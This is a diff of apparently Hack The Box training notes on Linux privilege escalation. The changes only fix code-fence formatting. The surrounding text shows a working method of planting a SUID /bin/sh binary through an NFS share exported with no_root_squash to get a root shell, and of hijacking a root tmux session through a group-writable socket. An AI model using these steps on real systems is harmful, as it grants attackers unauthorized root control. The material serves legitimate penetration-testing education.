@@ -12,8 +12,7 @@ If `tcpdump` is installed, unprivileged users may be able to capture network tra
 
 Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ showmount -e 10.129.2.12
 
 Export list for 10.129.2.12:
@@ -28,8 +27,7 @@ When an NFS volume is created, various options can be set:
 | `root_squash` | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
 | `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set. |
 
-```
-        shellsession
+```shellsession
 htb@NIX02:~$ cat /etc/exports
 
 # /etc/exports: the access control list for filesystems which may be exported
@@ -50,8 +48,7 @@ For example, we can create a SETUID binary that executes `/bin/sh` using our loc
 
 First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.
 
-```
-        shellsession
+```shellsession
 root@Pwnbox:/tmp$ cat shell.c 
 
 #include <stdio.h>
@@ -65,13 +62,11 @@ int main(void)
 }
 ```
 
-```
-        shellsession
+```shellsession
 root@Pwnbox:/tmp$ gcc shell.c -o shell
 ```
 
-```
-        shellsession
+```shellsession
 root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
 root@Pwnbox:/tmp$ cp shell /mnt
 root@Pwnbox:/tmp$ chmod u+s /mnt/shell
@@ -79,8 +74,7 @@ root@Pwnbox:/tmp$ chmod u+s /mnt/shell
 
 When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.
 
-```
-        shellsession
+```shellsession
 htb@NIX02:/tmp$  ls -la
 
 total 68
@@ -92,8 +86,7 @@ drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
 <SNIP>
 ```
 
-```
-        shellsession
+```shellsession
 htb@NIX02:/tmp$ ./shell
 root@NIX02:/tmp# id
 
@@ -106,8 +99,7 @@ uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plug
 
 Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.
 
-```
-        shellsession
+```shellsession
 htb@NIX02:~$ tmux -S /shareds new -s debugsess
 htb@NIX02:~$ chown root:devs /shareds
 ```
@@ -116,8 +108,7 @@ If we can compromise a user in the `devs` group, we can attach to this session a
 
 Check for any running `tmux` processes.
 
-```
-        shellsession
+```shellsession
 htb@NIX02:~$  ps aux | grep tmux
 
 root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
@@ -125,8 +116,7 @@ root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shared
 
 Confirm permissions.
 
-```
-        shellsession
+```shellsession
 htb@NIX02:~$ ls -la /shareds 
 
 srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
@@ -134,8 +124,7 @@ srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
 
 Review our group membership.
 
-```
-        shellsession
+```shellsession
 htb@NIX02:~$ id
 
 uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
@@ -143,8 +132,7 @@ uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
 
 Finally, attach to the `tmux` session and confirm root privileges.
 
-```
-        shellsession
+```shellsession
 htb@NIX02:~$ tmux -S /shareds
 
 id
